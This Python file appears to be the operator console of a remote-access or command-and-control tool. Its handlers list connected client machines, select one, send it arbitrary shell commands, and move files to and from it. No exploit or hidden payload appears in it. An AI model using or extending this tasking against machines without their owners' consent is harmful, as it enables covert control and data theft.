def cmd_list(server, args, current_client):
    if not server.clients:
        print("no clients")
        return current_client

    for cid, c in server.clients.items():
        print(f"{cid} | {c['hostname']} | {c['mac']}")
    
    return current_client

def cmd_use(server, args, current_client):
    if not args:
        print("usage: use <client_id>")
        return current_client
    
    cid = args[0]

    if cid not in server.clients:
        print("unknow client")
        return current_client
    
    print (f"selected {cid}")
    return cid

def cmd_shell(server, args, current_client):
    if not current_client:
        print("no client selected")
        return current_client
        
    if not args:
        print("usage: shell <cmd>")
        return current_client
    
    server.send_task(current_client, "shell", {
        "cmd": " ".join(args)
    })

    return current_client

def cmd_upload(server, args, current_client):
    if not current_client:
        print("no client selected")
        return current_client
    
    if len(args) < 2:
        print("usage: upload <client_path> <server_path>")
        return current_client

    try:
        server.upload_file(current_client, args[0], args[1])
    except FileNotFoundError:
        print(f"file not found: {args[0]}")

    return current_client

def cmd_download(server, args, current_client):
    if not current_client:
        print("no client selected")
        return current_client
    
    if len(args) < 2:
        print("usage: download <server_path> <client_path>")
        return current_client
    
    server.download_file(current_client, args[0], args[1])
    return current_client

def cmd_health(server, args, current_client):
    if not current_client:
        print("no client selected")
        return current_client
    
    server.send_task(current_client, "health", {})
    return current_client

def cmd_results(server, args, current_client):
    if not current_client:
        print("no client selected")
        return current_client
    
    client = server.clients[current_client]

    for tid, r in client["results"].items():
        print(f"{tid} [{r['status']}] -> {r['output']}")

    return current_client
    
def cmd_exit(server, args, current_client):
    print("bye")
    exit()

def cmd_help(server, args, current_client):
    print("available commands:")
    for name in COMMANDS:
        print(f"- {name}")
    return current_client

COMMANDS = {
    "shell": cmd_shell,
    "upload": cmd_upload,
    "download": cmd_download,
    "health": cmd_health,
    "list": cmd_list,
    "results": cmd_results,
    "use": cmd_use,
    "exit": cmd_exit,
    "help": cmd_help
}
